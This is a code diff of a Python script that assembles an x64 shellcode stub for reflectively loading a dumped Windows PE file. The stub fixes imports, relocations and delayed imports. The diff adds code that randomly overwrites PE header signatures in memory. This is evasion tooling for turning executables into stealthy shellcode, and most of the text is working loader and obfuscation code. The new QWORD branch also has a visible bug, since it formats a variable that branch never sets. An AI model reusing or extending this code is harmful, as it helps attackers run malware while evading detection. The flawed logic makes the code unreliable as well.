@@ -3,6 +3,10 @@ from keystone import *
 import argparse
 import random
 
+
+
+
+
 def print_banner():
     banner="""
 ██╗███╗   ██╗███████╗██╗      █████╗ ████████╗██╗██╗   ██╗███████╗    
@@ -119,6 +123,30 @@ def obfuscate_header(pe_header_array, segments):
     return obfuscated_header
 
 
+def modify_pe_signatures(segments):
+    print("[!] Dynamically generated instructions to obfuscate remained PE signatures:")
+    instructions = []
+    for segment in segments:
+        offset, size = next(iter(segment.items()))
+  #  for segment, size in segments.items():
+        if size == 2:  # For WORD
+            random_value = random.getrandbits(16)
+            instruction = f"    mov word ptr [rbx+{offset:#x}], {random_value:#04x};"
+        elif size == 4:  # For DWORD
+            random_value = random.getrandbits(32)
+            instruction = f"    mov dword ptr [rbx+{offset:#x}], {random_value:#08x};"
+        elif size == 8:  # For QWORD
+            random_value1 = random.getrandbits(32)
+            random_value2 = random.getrandbits(32)
+            instruction = f"    mov dword ptr [rbx+{offset:#x}], {random_value:#08x};\n    mov dword ptr [rbx+{offset+4:#x}], {random_value2:#08x};"
+        else:
+            raise ValueError("Unsupported size for segment.")
+        instructions.append(instruction)
+    return "\n".join(instructions)
+
+
+
+
 if __name__ == "__main__":
     print_banner()
     parser = argparse.ArgumentParser(description='Dynamically generate shellcode stub to append to the dump file')
@@ -133,7 +161,6 @@ if __name__ == "__main__":
     output = args.output
     sc_exec = args.sc_exec
     pe_array = read_dump_file(bin)
-
     update_cmdline_asm = generate_asm_by_cmdline(cmdline)	# Generate shellcode that used to update command line
 
 
@@ -220,10 +247,30 @@ f"{update_cmdline_asm}"
 )
 
 
+
+
+
+
+
+
     ks = Ks(KS_ARCH_X86, KS_MODE_64)
     encoding, count = ks.asm(CODE)
     CODE_LEN = len(encoding) + 25     
     CODE_OFFSET = 4096 - CODE_LEN
+    e_lfanew, = struct.unpack('<I', pe_array[0x3c:0x3c+4])
+    print("[!] The offset to NT header is "+ str(hex(e_lfanew)))
+
+    segments = [{0x3c: 4}, {e_lfanew+0x28: 4}, {e_lfanew+0x30: 8}, {e_lfanew+0x50: 4}, {e_lfanew+0x90: 8}, {e_lfanew+0xb0: 8}, {e_lfanew+0xf0: 8}] # Segments in PE header that need to be intact
+# e_lfanew, entry point, preferred address, size of image, export directory, import directory, baserelocation directory, delayed import directory 
+    obfuscated_signatures = modify_pe_signatures(segments)
+    print(obfuscated_signatures+"\n")
+
+
+
+
+
+
+
 
     CODE2 = (
 " jmp fix_import_dir;"			# Jump to fix_iat section
@@ -306,8 +353,6 @@ f"lea rbx, [rip+{CODE_OFFSET}];"	# Jump to the dump file
 "loop_end:"
 
 
-
-
 "fix_basereloc_dir:"			# Save RBX //dq rbx+21b0 l46
 " xor rsi, rsi;"
 " xor rdi, rdi;"
@@ -332,7 +377,6 @@ f"lea rbx, [rip+{CODE_OFFSET}];"	# Jump to the dump file
 
 
 "loop_block:"
-#" int3;"
 " cmp rsi, rdi;"          		# Compare current block with the end of BaseReloc
 " jge basereloc_fixed_end;"    		# If equal, exit the loop
 " xor r8, r8;"
@@ -387,9 +431,6 @@ f"lea rbx, [rip+{CODE_OFFSET}];"	# Jump to the dump file
 
 
 "basereloc_fixed_end:"
-#" sub rsp, 0x8;"			# Stack alignment
-
-
 
 
 "fix_delayed_import_dir:"
@@ -465,6 +506,7 @@ f"lea rbx, [rip+{CODE_OFFSET}];"	# Jump to the dump file
 " xor r9, r9;"
 " mov r9d, dword ptr [rax+0x28];"	# R9 = Entry point RVA
 " mov rcx, rbx;"			# RCX = Image Base
+f"{obfuscated_signatures}"
 " add rbx, r9;"				# RBX = Entry Point    	
 " xor rdx, rdx;"
 " inc rdx;"
@@ -485,15 +527,11 @@ f"lea rbx, [rip+{CODE_OFFSET}];"	# Jump to the dump file
 
     print("[+] Shellcode Stub size: "+str(len(shellcode))+" bytes")
 
-    e_lfanew, = struct.unpack('<I', pe_array[0x3c:0x3c+4])
-    print("[!] The offset to NT header is "+ str(e_lfanew))
     nop_segments = generate_nop_sequence(0x1000-len(shellcode))	# Pad the shellcode stub up to 0x1000 bytes
-    segments = [{0x3c: 4}, {e_lfanew+0x28: 4}, {e_lfanew+0x30: 8}, {e_lfanew+0x50: 4}, {e_lfanew+0x90: 8}, {e_lfanew+0xb0: 8}, {e_lfanew+0xf0: 8}] # Segments in PE header that need to be intact
-    # e_lfanew, entry point, preferred address, size of image, export directory, import directory, baserelocation directory, delayed import directory 
+
     merged_shellcode = shellcode + nop_segments + obfuscate_header(pe_array[0:0x1000], segments) + pe_array[0x1000:] 
     print("[!] Shellcoded PE's size: "+str(len(merged_shellcode))+" bytes\n\n")
     print_shellcode(merged_shellcode)
-
 
 
     try:
